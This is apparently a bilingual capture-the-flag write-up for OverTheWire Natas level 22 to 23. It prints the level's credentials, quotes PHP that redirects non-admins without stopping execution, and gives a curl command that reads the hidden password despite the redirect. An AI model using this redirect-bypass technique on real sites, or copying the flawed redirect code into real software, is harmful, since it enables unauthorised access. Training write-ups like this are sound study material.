# Natas Nivel 22 → 23

| Campo | Valor |
|-------|-------|
| **Juego / Game** | Natas |
| **Nivel / Level** | 22 → 23 |
| **URL** | https://overthewire.org/wargames/natas/ |
| **Conexión** | `http://natas22.natas.labs.overthewire.org` |

# username
natas22
# password
d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz
# web app vulnerability
insecure session handling
# method of solve
The web app code implies that we have to use the `revelio` URL parameter to access the password for the next level
```
<?php
session_start();

if(array_key_exists("revelio", $_GET)) {
    // only admins can reveal the password
    if(!($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)) {
    header("Location: /");
    }
}
?>
```
So we can use this curl command to access the password for the next level.
```
curl -u 'natas22:d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz' -v 'http://natas22.natas.labs.overthewire.org/?revelio'
```

---

## Fuentes / Sources

- OTW: https://overthewire.org/wargames/natas/ - fecha de acceso: 2026-09-25.
- Autor notas: Apuromafo.

---

## ⚠️ Aviso Legal / Disclaimer

> **ES:** Uso educativo y personal únicamente. No afiliado a OverTheWire.
> **EN:** Educational and personal use only. Not affiliated with OverTheWire.

_Fecha de edición: 2026-09-25_
